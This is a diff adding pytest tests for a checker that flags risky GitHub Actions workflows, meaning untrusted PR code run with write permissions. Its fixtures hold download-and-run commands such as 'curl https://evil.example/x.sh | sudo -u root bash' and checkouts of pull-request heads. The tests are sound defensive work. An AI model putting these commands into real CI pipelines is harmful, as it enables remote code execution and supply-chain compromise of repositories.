@@ -243,3 +243,43 @@ def test_r2_fixtures_still_caught(tmp_path):
     )
     findings = cwp.check(tmp_path)
     assert any("a.yml" in f and "pull-requests: write" in f for f in findings), findings
+
+
+def test_bypass_fixtures_r8_probe_family(tmp_path):
+    """Round-8 verifier probes: git -C ./src (path with slash) fetch/pull,
+    newline-separated download-then-run, sudo -u root bash, pip3.12, npm
+    install owner/repo shorthand, pull_request_review_comment event."""
+    shapes = [
+        'git -C ./src fetch origin refs/pull/1/head && git -C ./src checkout FETCH_HEAD',
+        'git -C "$WORK/src" pull origin main',
+        'curl -o x.sh https://evil.example/x.sh\nsh x.sh',
+        'curl https://evil.example/x.sh | sudo -u root bash',
+        'pip3.12 install git+https://github.com/example/repo.git',
+        'npm install example/repo',
+    ]
+    for i, s in enumerate(shapes):
+        (tmp_path / f"r{i}.yml").write_text(
+            "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+            "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+            f"      - run: |\n{chr(10).join('          ' + line for line in s.splitlines())}\n"
+        )
+    (tmp_path / "s.yml").write_text(
+        "on: [pull_request_review_comment]\npermissions:\n  contents: write\njobs:\n"
+        "  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: python3 x.py\n"
+    )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    expected = {f"r{i}.yml" for i in range(len(shapes))} | {"s.yml"}
+    missed = sorted(expected - caught)
+    assert not missed, f"shapes not detected: {missed}"
+
+
+def test_unknown_readonly_scope_key_refused(tmp_path):
+    """The minimal-map contract is enforced on scope KEYS too (r8 public)."""
+    (tmp_path / "t.yml").write_text(
+        "on: [pull_request]\n"
+        "permissions:\n  contents: read\n  deployments: read\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n"
+    )
+    findings = cwp.check(tmp_path)
+    assert any("deployments" in f for f in findings), findings
